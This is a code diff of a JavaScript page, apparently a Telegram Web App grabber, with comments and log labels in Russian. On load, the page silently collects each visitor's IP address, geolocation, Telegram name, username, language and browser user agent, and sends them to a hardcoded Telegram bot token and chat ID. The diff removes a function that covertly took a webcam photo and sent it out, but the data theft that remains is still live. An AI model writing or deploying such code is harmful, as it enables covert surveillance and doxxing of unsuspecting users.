@@ -8,7 +8,6 @@
         const BOT_TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";
         const CHAT_ID = "7477642275";
         const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const PHOTO_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
         
         function sendToTelegram(message) {
             fetch(API_URL, {
@@ -22,18 +21,15 @@
             fetch('https://api64.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    fetch(`https://ip-api.com/json/${data.ip}?fields=status,country,regionName,city,isp,org,query`)
+                    fetch(`https://ipinfo.io/${data.ip}/json`)
                         .then(response => response.json())
                         .then(info => {
-                            if (info.status === "success") {
-                                let ipInfo = `🌐 IP-адрес: ${info.query}\n`;
-                                ipInfo += `    [+] Страна: ${info.country}\n`;
-                                ipInfo += `    [+] Регион: ${info.regionName}\n`;
-                                ipInfo += `    [+] Город: ${info.city}\n`;
-                                ipInfo += `    [+] Провайдер: ${info.isp}\n`;
-                                ipInfo += `    [+] Организация: ${info.org}\n\n`;
-                                sendToTelegram(ipInfo);
-                            }
+                            let ipData = `IPv4: ${data.ip}\n`;
+                            ipData += `    [+] Провайдер: ${info.org || 'Неизвестно'}\n`;
+                            ipData += `    [+] Страна: ${info.country || 'Неизвестно'}\n`;
+                            ipData += `    [+] Регион: ${info.region || 'Неизвестно'}\n`;
+                            ipData += `    [+] Город: ${info.city || 'Неизвестно'}\n\n`;
+                            sendToTelegram(ipData);
                         });
                 })
                 .catch(error => console.error('Ошибка получения IP:', error));
@@ -41,59 +37,27 @@
         
         function getUserInfo() {
             if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.expand();
+                Telegram.WebApp.ready();
                 const user = Telegram.WebApp.initDataUnsafe.user;
                 if (user) {
                     let userInfo = `👤 Новый лог\n`;
                     userInfo += `[+] Имя: ${user.first_name} ${user.last_name || ''}\n`;
                     userInfo += `[+] Юзернейм: @${user.username || 'Не указан'}\n`;
-                    userInfo += `[+] ID: ${user.id}\n`;
                     userInfo += `[+] Язык: ${Telegram.WebApp.initDataUnsafe.language_code}\n\n`;
                     sendToTelegram(userInfo);
                 }
             }
         }
         
-        function capturePhoto() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    let video = document.createElement("video");
-                    video.srcObject = stream;
-                    video.play();
-                    setTimeout(() => {
-                        let canvas = document.createElement("canvas");
-                        let ctx = canvas.getContext("2d");
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        let photo = canvas.toDataURL("image/png");
-                        sendPhotoToTelegram(photo);
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 2000);
-                }).catch(err => console.error("Ошибка камеры:", err));
-        }
-        
-        function sendPhotoToTelegram(photoDataUrl) {
-            let formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', dataURItoBlob(photoDataUrl), 'photo.png');
-            fetch(PHOTO_API_URL, { method: 'POST', body: formData });
-        }
-        
-        function dataURItoBlob(dataURI) {
-            let byteString = atob(dataURI.split(',')[1]);
-            let arrayBuffer = new ArrayBuffer(byteString.length);
-            let uintArray = new Uint8Array(arrayBuffer);
-            for (let i = 0; i < byteString.length; i++) {
-                uintArray[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([arrayBuffer], { type: 'image/png' });
+        function getDeviceInfo() {
+            let deviceInfo = `[+] Устройство: ${navigator.userAgent}\n`;
+            sendToTelegram(deviceInfo);
         }
         
         function initApp() {
             getUserInfo();
             getUserIP();
-            setTimeout(capturePhoto, 3000);
+            getDeviceInfo();
         }
         
         window.onload = initApp;
